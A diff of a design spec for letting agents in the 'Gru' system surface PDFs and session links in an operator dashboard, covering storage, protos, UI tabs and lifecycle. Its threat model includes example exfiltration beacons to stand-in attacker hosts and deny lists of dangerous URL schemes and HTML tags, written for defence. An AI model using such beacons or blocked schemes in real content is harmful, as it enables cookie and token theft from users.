@@ -1,337 +1,350 @@
 # Agent-Surfaced Artifacts — Design Specification
 
-**Date:** 2026-04-24
+**Date:** 2026-04-24 (revised 2026-04-25 after design review)
 **Status:** Draft
-**Scope:** Lets a Gru-managed agent (minion) surface a piece of work — a rendered PDF, an HTML or Markdown report, or an external link — to the operator in the Gru UI. Extends the per-session main pane (currently just the Terminal tab) with additional artifact tabs and a compact link row.
+**Scope:** Lets a Gru-managed agent (minion) surface a piece of work — a rendered PDF — and attach session-level external links (GitHub PR, Slack thread, Figma) to a session. Extends the per-session main pane (currently just the Terminal tab) with artifact tabs and a compact link row.
 
 ---
 
 ## Goal
 
-Today, when a minion produces something the operator should look at — a resume, a design-review writeup, a rendered spec, a freshly-opened GitHub PR — the only surface is the terminal scrollback. The operator has to scroll, copy URLs, and run their own viewer. Every minion ends up reinventing this with a different markdown blob.
+Today, when a minion produces something the operator should look at — a resume, a design-review writeup, a freshly-opened GitHub PR — the only surface is the terminal scrollback. The operator has to scroll, copy URLs, and run their own viewer. Every minion ends up reinventing this with a different markdown blob.
 
-Give agents one well-defined way to say "here's an artifact" and one well-defined way for the UI to render it. Treat external links as a sibling shape (no payload, just a URL) so a session can also point at its own GitHub PR / Slack thread / Figma file with one click.
+Give agents one well-defined way to say "here's an artifact" and one well-defined way to say "here's where this session lives in your other tools."
 
 ---
 
-## 1. Artifact Model
+## Two shapes, two APIs
 
-### What is an artifact
+The first revision of this design folded byte artifacts (PDFs, etc.) and external links into one polymorphic table. They share almost no infrastructure — links have no bytes, no MIME, no sandbox, no `/artifacts/<id>` GET — so unifying them paid for symmetry with conditional-on-kind columns and branchy reader code. The revised design splits them:
 
-An artifact is a named piece of agent output addressed by `session_id + artifact_id`. Six kinds:
+- **Artifacts** (§1) — bytes a minion produces, served back through the Gru server, rendered inline in a tab.
+- **Session links** (§2) — URL pointers that the minion attaches to the session, rendered as a compact chip row above the active tab.
 
-| Kind   | Payload                | Renders as                                          |
-|--------|------------------------|-----------------------------------------------------|
-| `pdf`  | bytes (≤ 25 MB)        | tab → `<iframe>` of `application/pdf`               |
-| `html` | bytes (≤ 5 MB)         | tab → sandboxed `<iframe>` (see §3)                 |
-| `md`   | bytes (≤ 5 MB)         | tab → server-rendered HTML, sandboxed `<iframe>`    |
-| `image`| bytes (≤ 25 MB)        | tab → `<img>` (PNG/JPEG/WebP/GIF only)              |
-| `file` | bytes (≤ 25 MB)        | tab with download CTA, no preview                   |
-| `link` | URL only, no payload   | inline chip in the link row, opens in new tab       |
+These have separate tables, separate RPCs, separate UI. Cross-references between them are not needed.
 
-Caps are server defaults, configurable in `~/.gru/server.yaml`. Per-session caps: 50 artifacts, 100 MB total bytes. Limits exist to keep SQLite small and stop a runaway agent from filling the disk.
+---
+
+## 1. Artifacts (bytes)
+
+### Model
+
+An artifact is bytes addressed by an opaque, unguessable URL token. Metadata is just title + MIME type + size. The MVP server accepts only `application/pdf`; the upload path is shaped so that adding another MIME type later is purely an allowlist change. There is no `kind` field — the wire protocol describes the data, not the rendering decision.
+
+| Limit                      | Default      | Configurable in `~/.gru/server.yaml` |
+|----------------------------|--------------|--------------------------------------|
+| Per-artifact bytes         | 25 MB        | yes                                  |
+| Per-session count          | 50           | yes                                  |
+| Per-session total bytes    | 100 MB       | yes                                  |
+| Allowed MIME (MVP)         | `application/pdf` | yes (allowlist)                |
+
+Caps exist to keep SQLite small and to stop a runaway agent from filling the disk.
 
 ### Wire protocol — minion → server
-
-A new authenticated endpoint, mirroring the conventions of `POST /events`:
 
 ```
 POST /artifacts
 X-Gru-Session-ID: <uuid>             ; required
 X-Gru-Runtime: <runtime>             ; required, currently "claude-code"
 Authorization: Bearer <api-key>      ; same key the gRPC service uses
-Content-Type: multipart/form-data    ; for kinds with a payload
+Content-Type: multipart/form-data
 ```
 
-**Multipart fields** (kinds with bytes):
+Multipart fields:
 
 | Field      | Required | Notes                                                              |
 |------------|----------|--------------------------------------------------------------------|
-| `kind`     | yes      | one of `pdf` / `html` / `md` / `image` / `file`                    |
 | `title`    | yes      | ≤ 80 chars, displayed as the tab label                             |
-| `content`  | yes      | the file bytes                                                     |
+| `content`  | yes      | the file bytes; the part's `Content-Type` is the canonical MIME    |
 
-**JSON body** (kind = link, `Content-Type: application/json`):
+The server validates: MIME on the allowlist, magic-byte sniff matches the declared MIME (PDF must start with `%PDF-`), bytes within caps, session not in a terminal state (§5). On success, returns the full `Artifact` proto serialized as JSON, including the capability URL.
 
-```json
-{ "kind": "link", "title": "GitHub PR #428", "url": "https://github.com/…", "icon": "github" }
-```
+A new event type `artifact.created` is published on success carrying the same `Artifact` proto so UI subscribers don't have to refetch.
 
-`icon` is an optional shorthand the UI maps to a known glyph (`github`, `slack`, `figma`, `linear`, `notion`, `web`). Unknown icons fall back to a generic link glyph.
+### Capability URL
 
-Server response (both shapes):
+`<iframe src="…">` does not send `Authorization` — browsers don't attach custom headers to navigations. So the artifact endpoint cannot rely on the bearer token that protects `POST /artifacts` and the gRPC API.
 
-```json
-{ "id": "<artifact-uuid>", "session_id": "…", "kind": "pdf", "title": "Resume", "url": "/artifacts/<uuid>" }
-```
+Instead, each artifact has an unguessable token (32 bytes from `crypto/rand`, base64url-encoded) generated at upload. The full URL `/artifacts/<token>` is the capability — anyone who holds the URL can fetch the bytes, anyone who doesn't cannot. The token is what gets baked into the iframe `src`. Tokens are stored in the DB and never reissued for a given artifact ID, so cached URLs stay valid until the artifact (or its session) is deleted.
 
-The returned `url` is what the UI fetches for rendering — for `link` kind it is the operator-visible target URL itself; for everything else it is a server-relative path that streams the bytes.
+This keeps the GET endpoint simple (no header parsing, no per-request key derivation) and forward-compatible: if Gru ever serves over the public internet, add an expiry timestamp + HMAC and the design is the same shape. Cross-agent isolation (one minion holding another minion's token) is a non-goal; see §4.
 
 ### Storage
 
-- **Bytes on disk**: `~/.gru/artifacts/<session_id>/<artifact_id>.<ext>`, mode `0600`, owned by the gru server user. Filesystem (not SQLite) keeps the DB lean and lets the HTTP layer stream large PDFs cheaply.
-- **Metadata in SQLite**: a new `artifacts` table.
+- **Bytes on disk**: `~/.gru/artifacts/<session_id>/<artifact_id>.bin`, mode `0600`. Filesystem-not-DB keeps SQLite lean and lets the HTTP layer stream large files.
+- **Metadata in SQLite**: a new `artifacts` table, added in place to `001_init.sql` (no migration; the project nukes the DB on schema change).
 
 ```sql
 CREATE TABLE IF NOT EXISTS artifacts (
     id          TEXT PRIMARY KEY,
     session_id  TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
-    project_id  TEXT NOT NULL REFERENCES projects(id),
-    kind        TEXT NOT NULL,         -- pdf | html | md | image | file | link
     title       TEXT NOT NULL,
-    mime_type   TEXT NOT NULL DEFAULT '',
-    size_bytes  INTEGER NOT NULL DEFAULT 0,    -- 0 for links
-    url         TEXT NOT NULL DEFAULT '',      -- non-empty only for kind=link
-    filename    TEXT NOT NULL DEFAULT '',      -- on-disk filename for non-link kinds
-    icon        TEXT NOT NULL DEFAULT '',      -- link kind only, '' otherwise
+    mime_type   TEXT NOT NULL,
+    size_bytes  INTEGER NOT NULL,
+    token       TEXT NOT NULL UNIQUE,
     created_at  TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ', 'now'))
 );
 
 CREATE INDEX IF NOT EXISTS idx_artifacts_session_id ON artifacts(session_id);
+CREATE UNIQUE INDEX IF NOT EXISTS idx_artifacts_token ON artifacts(token);
 ```
 
-No migration file — added directly to `001_init.sql` (the project is still in DB-nuke-on-schema-change mode per the v1 design).
+`project_id` is omitted intentionally — it's recoverable through `sessions.project_id`, no query needs it directly, and `ON DELETE CASCADE` on `session_id` already handles project deletion.
 
 ### Proto + RPCs
 
-Add to `proto/gru/v1/gru.proto`:
-
 ```protobuf
-enum ArtifactKind {
-  ARTIFACT_KIND_UNSPECIFIED = 0;
-  ARTIFACT_KIND_PDF         = 1;
-  ARTIFACT_KIND_HTML        = 2;
-  ARTIFACT_KIND_MD          = 3;
-  ARTIFACT_KIND_IMAGE       = 4;
-  ARTIFACT_KIND_FILE        = 5;
-  ARTIFACT_KIND_LINK        = 6;
-}
-
 message Artifact {
   string id          = 1;
   string session_id  = 2;
-  string project_id  = 3;
-  ArtifactKind kind  = 4;
-  string title       = 5;
-  string mime_type   = 6;
-  int64  size_bytes  = 7;
-  string url         = 8;   // server-relative path or, for kind=link, the target URL
-  string icon        = 9;   // link kind only
-  google.protobuf.Timestamp created_at = 10;
+  string title       = 3;
+  string mime_type   = 4;
+  int64  size_bytes  = 5;
+  string url         = 6;   // full server-relative path including the capability token
+  google.protobuf.Timestamp created_at = 7;
 }
 
-rpc ListArtifacts(ListArtifactsRequest) returns (ListArtifactsResponse);
+rpc ListArtifacts(ListArtifactsRequest)   returns (ListArtifactsResponse);
 rpc DeleteArtifact(DeleteArtifactRequest) returns (DeleteArtifactResponse);
 
 message ListArtifactsRequest  { string session_id = 1; }
-message ListArtifactsResponse { repeated Artifact artifacts = 1; }
-message DeleteArtifactRequest { string id = 1; }
-message DeleteArtifactResponse { bool success = 1; }
+message ListArtifactsResponse {
+  repeated Artifact artifacts  = 1;
+  int32             count      = 2;   // current count, for cap pre-checks
+  int64             bytes_used = 3;   // current total bytes, for cap pre-checks
+}
+message DeleteArtifactRequest  { string id = 1; }
+message DeleteArtifactResponse { bool   success = 1; }
 ```
 
-Creation is HTTP-only (multipart), not gRPC — connect-rpc multipart support is awkward and the path mirrors `/events`. Listing and deletion stay on gRPC for consistency with the rest of the dashboard.
-
-A new event type `artifact.created` is published on every successful upload so the UI's existing `SubscribeEvents` stream picks it up without a poll. Payload:
-
-```json
-{ "artifact_id": "<uuid>", "kind": "pdf", "title": "Resume" }
-```
+Creation is HTTP multipart (mirrors `/events`), listing and deletion are gRPC (mirror the rest of the dashboard API). The agent-side helper hides the asymmetry behind one CLI subcommand.
 
 ### Minion-side helper
 
-A new CLI subcommand wraps the multipart POST so agents can upload from a Bash tool call:
-
 ```
-gru artifact add --kind pdf --title "Resume" --file out.pdf
-gru artifact link --title "GitHub PR #428" --icon github --url https://github.com/…
+gru artifact add --title "Resume" --file out.pdf
 ```
 
-Reads the session ID from `<cwd>/.gru/session-id` (same lookup used by `hooks/claude-code.sh`) and the server addr/key from `~/.gru/server.yaml`. No new hook event type, no new env var contract — agents just shell out.
+Reads the session ID from `<cwd>/.gru/session-id` (same lookup `hooks/claude-code.sh` uses) and the server addr/key from `~/.gru/server.yaml`. No new hook event type, no new env var contract.
 
-A skill ships in `skills/surfacing-artifacts/` so agents know when to use the helper. Not part of MVP wire-protocol scope, but called out so this design composes with the existing skill model.
+The 409-on-cap response includes the same `count` and `bytes_used` fields as `ListArtifactsResponse`, so the agent has actionable info: it can list its existing artifacts, pick one to delete, and retry. Auto-eviction is deliberately not in the server's job description — silent eviction would surprise the agent that thought it had surfaced something.
 
 ---
 
-## 2. UI Integration
+## 2. Session links (URLs)
+
+### Model
+
+A session link is just `(session_id, title, url)`. No bytes, no token, no rendering, no sandbox.
+
+```sql
+CREATE TABLE IF NOT EXISTS session_links (
+    id          TEXT PRIMARY KEY,
+    session_id  TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
+    title       TEXT NOT NULL,
+    url         TEXT NOT NULL,
+    created_at  TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ', 'now'))
+);
+
+CREATE INDEX IF NOT EXISTS idx_session_links_session_id ON session_links(session_id);
+```
+
+### Proto + RPCs
+
+```protobuf
+message SessionLink {
+  string id         = 1;
+  string session_id = 2;
+  string title      = 3;
+  string url        = 4;
+  google.protobuf.Timestamp created_at = 5;
+}
+
+rpc AddSessionLink(AddSessionLinkRequest)       returns (SessionLink);
+rpc ListSessionLinks(ListSessionLinksRequest)   returns (ListSessionLinksResponse);
+rpc DeleteSessionLink(DeleteSessionLinkRequest) returns (DeleteSessionLinkResponse);
+
+message AddSessionLinkRequest    { string session_id = 1; string title = 2; string url = 3; }
+message ListSessionLinksRequest  { string session_id = 1; }
+message ListSessionLinksResponse { repeated SessionLink links = 1; }
+message DeleteSessionLinkRequest  { string id = 1; }
+message DeleteSessionLinkResponse { bool   success = 1; }
+```
+
+Server-side validation on add: scheme allowlist `https`, `http`, `mailto`; reject `javascript:`, `data:`, `file:`, RFC1918 / link-local hostnames; URL parses cleanly via `net/url`. Cap: 20 links per session.
+
+A new event type `session_link.created` is published on success carrying the `SessionLink` proto.
+
+### Minion-side helper
+
+```
+gru link add --title "GitHub PR #428" --url https://github.com/foo/bar/pull/428
+```
+
+Same session-id and server-config lookup as the artifact helper. Icons are derived client-side from the URL hostname (`github.com` → GitHub glyph, `slack.com` → Slack glyph, etc.) — the agent doesn't pick an icon and the server doesn't store one.
+
+---
+
+## 3. UI Integration
 
 ### Tab bar above the main pane
 
-`TerminalPanel` currently fills the `<main>` element by itself. Replace its title bar with a per-session **tab bar**:
+`TerminalPanel` currently fills the `<main>` element by itself. Replace its title bar with a per-session tab bar:
 
 ```
 ┌─────────────────────────────────────────────────────────────────┐
-│ [Terminal] [Resume.pdf] [Design review] [Rendered spec]    [⤢] │  ← tab bar
+│ [Terminal] [Resume.pdf] [Design review]                    [⤢] │  ← tab bar
 ├─────────────────────────────────────────────────────────────────┤
 │ 🔗 GitHub PR #428   💬 Slack thread   🎨 Figma                  │  ← link row (only when present)
 ├─────────────────────────────────────────────────────────────────┤
 │                                                                 │
-│                  Active tab content here                        │
+│                  Active tab content                             │
 │                                                                 │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
-- **Terminal** is always the first tab and always present. Default selection on session open. Defending Ctrl-key claims and the focus-ref behavior in `TerminalPanel.tsx` stay unchanged.
-- **Artifact tabs** are non-link artifacts, sorted by `created_at` ascending (oldest first → tabs don't shuffle when a new one arrives). The newest gets a brief visual ping (e.g., a 3 s pulse on the tab) to draw the eye without auto-switching focus. We never auto-switch off Terminal — the operator's keystrokes always go where they're looking.
-- **Link row** is rendered below the tab bar only when ≥ 1 `link` artifact exists. Each link is a compact chip (icon + title), `target="_blank"`, `rel="noopener noreferrer"`. Right-click → "copy link" via native browser behavior. No extra tab; clicking a chip leaves the Gru tab open and pops a new browser tab.
-- A small `…` overflow menu on each artifact tab offers **Open in new tab** (loads the artifact URL directly, useful for PDFs the operator wants to keep open while doing other things) and **Delete** (calls `DeleteArtifact` after a confirm).
+- **Terminal** is always tab 0 and always present. Default selection on session open.
+- **Artifact tabs** sorted by `created_at` ascending — tab position stays stable when a new one arrives. We never auto-switch off Terminal; the operator's keystrokes always go where they're looking.
+- **Link row** rendered below the tab bar only when ≥ 1 link exists. Each link is a chip (icon + title), `target="_blank" rel="noopener noreferrer nofollow"`. Clicking pops a new browser tab; right-click → "copy link" via native browser behavior.
+- A `…` overflow menu on each artifact tab offers **Open in new tab** (loads the artifact URL directly) and **Delete** (calls `DeleteArtifact` after a confirm).
 
-Tabs are rendered by a new `SessionTabs.tsx`. The artifact list comes from `ListArtifacts(session_id)` on session open + live updates from `artifact.created` events on the existing `SubscribeEvents` stream. No new socket.
+Tabs are rendered by a new `SessionTabs.tsx`. Artifacts and links come from `ListArtifacts(session_id)` + `ListSessionLinks(session_id)` on session open, with live updates from `artifact.created` and `session_link.created` events on the existing `SubscribeEvents` stream.
 
 ### Per-tab content rendering
 
-| Kind   | Component                | Notes                                                                 |
-|--------|--------------------------|-----------------------------------------------------------------------|
-| `pdf`  | `<iframe sandbox="" src="/artifacts/<id>">` | Browser PDF viewer. `sandbox=""` blocks JS embedded in the PDF.      |
-| `html` | `<iframe sandbox="" src="/artifacts/<id>">` | See §3. Server-side sanitized + CSP `sandbox` response header.       |
-| `md`   | same as `html`           | Server renders MD → HTML once at upload time, stores rendered HTML on disk alongside the source `.md`. Re-renders on demand only if storage format changes. |
-| `image`| `<img src="/artifacts/<id>">`              | MIME enforced server-side; only PNG/JPEG/WebP/GIF accepted.          |
-| `file` | Card with filename, size, **Download** button | `<a href="/artifacts/<id>" download>` — `Content-Disposition: attachment`. |
-| `link` | Inline chip in the link row, never a tab.   | See above.                                                            |
+For MVP, the only previewable MIME is `application/pdf`:
 
-Mobile / narrow viewport: tabs scroll horizontally; the link row wraps. Same `coarse-pointer` tap handling that `TerminalPanel` already does for URL detection.
+```html
+<iframe sandbox="" src="/artifacts/<token>" referrerpolicy="no-referrer" />
+```
 
-### Empty / loading states
+The renderer is MIME-driven, not kind-driven. Adding another MIME type (image, sanitized HTML, etc.) is a server allowlist change plus a renderer branch, not a wire-protocol change. Anything outside the allowlist falls back to a download CTA — server sends `Content-Disposition: attachment` and the UI shows a card with title, size, and a download button.
 
-- Session has no artifacts → tab bar shows only "Terminal", no link row (today's behavior).
-- Artifact upload in flight (we see `artifact.created` but the bytes haven't been GETted yet) → tab is rendered with a spinner; click selects it and shows a skeleton until the bytes arrive.
-- Artifact 404 (operator deleted, race) → tab self-removes and the panel falls back to Terminal.
+Mobile / narrow viewport: tabs scroll horizontally; the link row wraps. The existing `coarse-pointer` tap handling in `TerminalPanel` for link activation remains unchanged.
 
 ---
 
-## 3. Security
-
-Artifacts come from a minion. A minion is an LLM-driven process that an attacker (via prompt injection, malicious file content, or compromised tools) can influence. Treat artifact bytes as fully untrusted input.
+## 4. Security
 
 ### Threat model
 
-1. **Script execution in HTML/MD/SVG** — embedded `<script>`, `on*=` handlers, `javascript:` URLs, `<svg>` with `<script>` children, MathML hacks.
-2. **Cookie / token theft** — same-origin reads, `document.cookie`, `fetch('/api/...')` with the operator's API-key cookie.
-3. **Phishing / clickjacking** — overlaid HTML that mimics the Gru UI to capture credentials or trick approval.
-4. **Exfiltration via outbound resource loads** — `<img src="https://attacker.example/?cookies=...">` style beaconing.
-5. **PDF embedded JS** — Acrobat-flavored JS in PDFs (modern browser PDF viewers usually disable, but defense in depth).
-6. **External links pointing somewhere malicious** — `javascript:`, `data:text/html`, file://, internal-network URLs.
+Artifacts come from a minion. A minion is an LLM-driven process that prompt injection, malicious file content, or compromised tools can influence. Treat artifact bytes as fully untrusted input.
 
-### Defenses — layered
+The threats:
 
-**Layer 1 — server-side validation at upload.**
-- Reject mismatched MIME (`pdf` must be `%PDF-` magic; `image` must match its type sniff; `md` must be UTF-8 text).
-- For `md`: render to HTML server-side using `gomarkdown` (or equivalent) with raw HTML disabled, then run the result through `bluemonday.UGCPolicy()` extended to allow only safe tags. Store both source and rendered output; the iframe loads the rendered HTML.
-- For `html`: run input through `bluemonday.UGCPolicy()` with **no** allowance for `<script>`, `<iframe>`, `<object>`, `<embed>`, `<link>`, `<meta>`, `on*` attrs, `style` URL functions (`url(javascript:...)`), or `srcset`. Outbound resource hosts are restricted to `data:` and same-origin only — no third-party fetches.
-- For `link`: scheme allowlist `https`, `http`, `mailto`. Reject `javascript:`, `data:`, `file:`, RFC1918 / link-local hostnames. Validate URL parses cleanly (`net/url`).
+1. **Script execution in untrusted bytes** — embedded JS in HTML/SVG/PDF, `on*=` handlers, `javascript:` URLs.
+2. **Cookie or token theft** — same-origin reads, exfiltration of the operator's bearer.
+3. **Phishing / clickjacking** — overlaid HTML mimicking the Gru UI to capture credentials or trick approval.
+4. **Outbound exfiltration via embedded resources** — `<img src="https://attacker/?…">`.
+5. **External links pointing somewhere malicious** — `javascript:`, `data:text/html`, `file://`, internal-network URLs.
+6. **CSRF from another origin** — a malicious page the operator visits issuing requests against `localhost:7777`.
+7. **Cross-agent reads** — one minion fetching another minion's artifacts.
 
-**Layer 2 — HTTP response headers on `/artifacts/<id>`.**
-- `Content-Type` set explicitly per kind (no sniff): `application/pdf`, `text/html; charset=utf-8`, `image/png`, etc.
-- `X-Content-Type-Options: nosniff`
-- `Content-Disposition: attachment` for `kind=file`; `inline` for previewable kinds.
-- `Content-Security-Policy: sandbox; default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; font-src 'self' data:; base-uri 'none'; form-action 'none'` for `html` and `md`. The `sandbox` directive forces the browser to treat the response as if it were in a sandboxed iframe even if the user navigates to it directly.
-- `Cross-Origin-Resource-Policy: same-site`.
-- For `image`: a tighter CSP that disallows everything except the image itself.
+### Defense
 
-**Layer 3 — iframe sandboxing in the UI.**
+**Server-side validation at upload.** MIME allowlist + magic-byte sniff for every accepted type (PDF must start with `%PDF-`). Title length-capped. URL scheme allowlist for links, with RFC1918 / link-local hostname rejection. When the MVP's MIME allowlist grows beyond PDF, each new type carries its own validation rule (e.g., HTML through `bluemonday.UGCPolicy()` with `<script>`, `<iframe>`, `<object>`, `<embed>`, `<link>`, `<meta>`, `on*` attrs all denied). PDF needs no body sanitization — the iframe sandbox is enough.
 
-```html
-<iframe sandbox="" src="/artifacts/<id>" referrerpolicy="no-referrer" />
-```
+**Browser-side sandbox.** Every artifact is rendered inside `<iframe sandbox="" src="…" referrerpolicy="no-referrer">`. Empty `sandbox=""` (no flags) gives the iframe an opaque origin: no cookies, no localStorage, no parent-DOM access, no script execution, no top-level navigation, no form submission, no popups. Even if upload-time validation is bypassed and `<script>` reaches the iframe, it cannot run.
 
-Empty `sandbox=""` (no flags) gives:
-- Opaque origin: no access to parent's cookies, localStorage, or DOM.
-- No script execution.
-- No top-level navigation (`<a target=_top>` is inert).
-- No form submission.
-- No popups, no auto-play, no API access.
+**Hardening headers on `/artifacts/<token>`.** `Content-Type` set explicitly per artifact (no sniff), `X-Content-Type-Options: nosniff`, `Cross-Origin-Resource-Policy: same-site`, `Content-Disposition` either `inline` for previewable MIMEs or `attachment` otherwise. CSP `sandbox` is intentionally not listed as a separate "layer" — it overlaps the iframe sandbox and behavior across browsers (especially with the native PDF viewer) is uneven enough that it's not load-bearing here.
 
-Even if Layer 1 sanitization is bypassed and `<script>` reaches the iframe, it cannot run.
+### Cross-origin posture
 
-**Layer 4 — link rendering.**
+The dashboard runs on `localhost:3000`, the API on `:7777`. The bearer (`VITE_GRU_API_KEY`) is compiled into the dashboard's JS bundle. Concretely:
 
-```jsx
-<a href={url} target="_blank" rel="noopener noreferrer nofollow">{title}</a>
-```
+- **CORS allowlist for `:7777`** is `localhost:3000` (and the operator's tailnet host) only. A page at `evil.example` cannot read responses from the API even if it tries to fetch them — the bearer is in another origin's bundle and not exposed via cookie, so cross-origin requests from a malicious page authenticate as nobody.
+- **Capability URLs for artifact GETs** mean iframe loads do not depend on CORS or cookies. The token in the URL is the only credential.
+- **DNS rebinding against `localhost`** is a concern for the entire API surface, not specific to artifacts. Out of scope here; address it once at the server level (Host-header allowlist) when it bites.
 
-`noopener` blocks `window.opener` access; `noreferrer` strips the referrer; `nofollow` discourages crawlers from following minion-attributed links.
+### Cross-agent isolation — explicit non-goal
 
-### Out of scope for this spec
+Every minion holds the same bearer and can `ListArtifacts` / `ListSessionLinks` for any session. Today this is fine: Gru is single-operator and minions are presumed to trust each other. If multi-tenant or cross-agent mistrust ever becomes a real requirement, scope the bearer per session at launch. Calling this out so an implementer doesn't accidentally lean on it.
 
-- Signed URLs / per-artifact tokens. Today the gru server is local-only (tailnet/loopback bind); the existing bearer-token auth on the API surface is sufficient. Revisit if Gru ever serves over the public internet.
-- Antivirus / sandboxed file scanning. Operators are presumed to trust their own minions; the threat we defend against is malicious *content*, not malicious *infrastructure*.
+### Out of scope
+
+- Signed/expiring URLs. Capability URLs with no expiry are correct for the local-only deployment. Add HMAC + expiry the day Gru goes public.
+- Antivirus / sandboxed file scanning. The threat is malicious *content*, not malicious *infrastructure*.
+- Per-operator artifact ACLs.
 
 ---
 
-## 4. Lifecycle
+## 5. Lifecycle
 
 ### Creation
 
-- One row in `artifacts`, one file on disk per non-link artifact.
-- Server validates kind, MIME, size against caps before writing.
-- Atomic create: write to `<artifact_id>.<ext>.tmp`, fsync, rename. DB row inserted only after the rename succeeds.
-- Per-session caps enforced inside a transaction: count + sum(size_bytes) checked before insert; over-cap uploads return `409 Conflict` with a structured error.
+- One row in `artifacts`, one file on disk.
+- Session-state precondition: `POST /artifacts` returns `410 Gone` if the session is in a terminal state (`completed`, `errored`, `killed`). `404` if the session doesn't exist. Avoids races where an agent uploads to a session the operator just killed.
+- Atomic create order: insert DB row first (with token), then write `<artifact_id>.bin.tmp`, fsync, rename to `<artifact_id>.bin`. If the file write fails, delete the row before returning the error so we don't leave a metadata-only artifact. If the row insert fails, no file was ever created.
+- Per-session caps enforced inside the same transaction as the insert: count + sum(size_bytes) checked before insert; over-cap returns `409 Conflict` with current count and bytes_used so the agent helper can react.
 
 ### Updates
 
-Artifacts are **immutable**. An agent that wants to "update" uploads a new artifact and (optionally) deletes the old one. Two reasons:
-
-1. UI staleness — an open iframe pointing at `/artifacts/<id>` doesn't have to invalidate.
-2. Audit — an event log of artifacts the agent surfaced is more useful when each entry is point-in-time.
-
-If a strong "supersedes" relationship is needed later, add an optional `replaces` field to the upload request and a `superseded_by` column. Out of scope for MVP.
+Artifacts are immutable. An agent that wants to "update" uploads a new artifact and (optionally) deletes the old one. Tokens never get reissued; cached URLs stay valid for the artifact's lifetime.
 
 ### Garbage collection
 
-| Trigger                                | Effect                                                                  |
-|---------------------------------------|-------------------------------------------------------------------------|
-| `DeleteArtifact(id)`                  | Delete row → unlink file. Errors logged but don't block the row delete. |
-| `DeleteSession(session_id)`           | `ON DELETE CASCADE` removes rows; a server-side hook `rm -rf <dir>`.    |
-| `PruneSessions()`                     | Same as above for every terminal session it touches.                    |
-| Server boot                           | Scan `~/.gru/artifacts/` for orphan directories (no matching session) — log + remove. |
-| Per-session cap exceeded on upload    | Reject the upload; do **not** auto-evict. Agents must clean up after themselves. |
+| Trigger                              | Effect                                                        |
+|--------------------------------------|---------------------------------------------------------------|
+| `DeleteArtifact(id)`                 | Delete row → unlink file. File-unlink errors logged + queued for the orphan sweep, not surfaced to the caller. |
+| `DeleteSession(session_id)`          | `ON DELETE CASCADE` removes rows; server then `rm -rf` the session's artifact directory. |
+| `PruneSessions()`                    | Same as above for every terminal session it touches.         |
+| Server boot                          | Scan `~/.gru/artifacts/` for directories without a matching session row, and for files without a matching artifact row → log + remove. |
+| Per-session cap exceeded on upload   | Reject with `409`. No auto-eviction.                         |
 
-The choice to make agents clean up rather than LRU-evict is deliberate: silent eviction would surprise agents that thought they had surfaced something. A clear `409` is easier to handle.
+The `rm -rf`-can-fail-and-doesn't-block-row-delete behavior is what makes the boot-time orphan sweep necessary; it's not redundant.
+
+### PWA / cached URLs
+
+The dashboard is plain Vite + React 19 today, no service worker. If a service worker is added later, artifact `id`s and `token`s are never reused, so there is no cache-poisoning risk from a UUID collision — the worst case is a stale cached 404 after deletion, which is fine.
 
 ### Caps (defaults)
 
 ```yaml
 # ~/.gru/server.yaml
 artifacts:
-  per_artifact_max_bytes:
-    pdf: 25_000_000
-    html: 5_000_000
-    md: 5_000_000
-    image: 25_000_000
-    file: 25_000_000
-  per_session_max_bytes: 100_000_000
-  per_session_max_count: 50
+  per_artifact_max_bytes: 25_000_000
+  per_session_max_bytes:  100_000_000
+  per_session_max_count:  50
+  allowed_mime: ["application/pdf"]
+session_links:
+  per_session_max_count:  20
 ```
 
 ---
 
-## 5. Minimum Viable Scope
+## 6. Minimum Viable Scope
 
-Goal: an agent says "here's a PDF" or "here's a link" and the operator sees it. Defer everything else.
+Goal: an agent says "here's a PDF" or "here's a link" and the operator sees it.
 
 **In MVP:**
-1. New `artifacts` table; `001_init.sql` patched in place.
-2. `Artifact` proto message + `ListArtifacts`, `DeleteArtifact` RPCs. New event type `artifact.created`.
-3. `POST /artifacts` HTTP handler accepting only `kind=pdf` and `kind=link`. Multipart for PDF, JSON for link. Bearer auth, header-based session lookup matching `/events`.
-4. `GET /artifacts/<id>` streamer with §3 Layer 2 headers — for MVP the only previewable kind is PDF, which already gets browser-native rendering inside the empty-sandbox iframe.
-5. CLI: `gru artifact add --kind pdf --title T --file F` and `gru artifact link --title T --url U [--icon I]`.
+1. Two new tables (`artifacts`, `session_links`); `001_init.sql` patched in place.
+2. Proto: `Artifact` and `SessionLink` messages; `ListArtifacts`, `DeleteArtifact`, `AddSessionLink`, `ListSessionLinks`, `DeleteSessionLink` RPCs. Two new event types: `artifact.created`, `session_link.created`.
+3. `POST /artifacts` HTTP handler — multipart only, MIME allowlist of `application/pdf`, capability-token URL minted at upload, atomic create.
+4. `GET /artifacts/<token>` streamer with the §4 hardening headers.
+5. CLI: `gru artifact add` and `gru link add`.
 6. Web UI: replace `TerminalPanel`'s title bar with `SessionTabs.tsx`; render PDF tabs as `<iframe sandbox="">`; render the link row when ≥ 1 link exists.
-7. Lifecycle: cascade-delete on session delete; per-session caps enforced; orphan-directory sweep on boot.
+7. Lifecycle: cascade-delete on session delete; per-session caps enforced; orphan-directory + orphan-file sweep on boot; `410` on uploads to terminal sessions.
 
-**Deferred (follow-up specs):**
-1. `kind=html`, `kind=md`, `kind=image`, `kind=file` — adds the full §3 sanitization stack and additional MIME validation.
-2. The `surfacing-artifacts` agent skill — once we know how the PDF + link primitive feels in practice.
-3. `replaces` / `superseded_by` semantics.
-4. Per-artifact signed URLs (only relevant if Gru ever exposes the artifact endpoint to the public internet).
-5. Auto-attaching PR/Slack/Figma links from session metadata (e.g., a `gh pr create` in the session detected by a hook → automatic `link` artifact). Worth doing once the manual primitive works, but not before.
+**Deferred:**
+1. Additional MIME types (HTML with sanitization, Markdown, images, generic file downloads). Each is a server-allowlist + renderer change against the same wire shape.
+2. A `surfacing-artifacts` skill for agents to know when to use the helper. Worth doing once we know how the primitive feels.
+3. Auto-attaching links from session activity (e.g., a hook that detects `gh pr create` and posts a `session_link`).
 
-The MVP is small enough to land in a single PR and exercises the full path: agent → CLI → server → DB + disk → publish event → UI tab → iframe render. Everything afterward is incremental.
+The MVP exercises the full path — agent → CLI → server → DB + disk → publish event → UI tab → iframe render — and is small enough to land in a single PR.
 
 ---
 
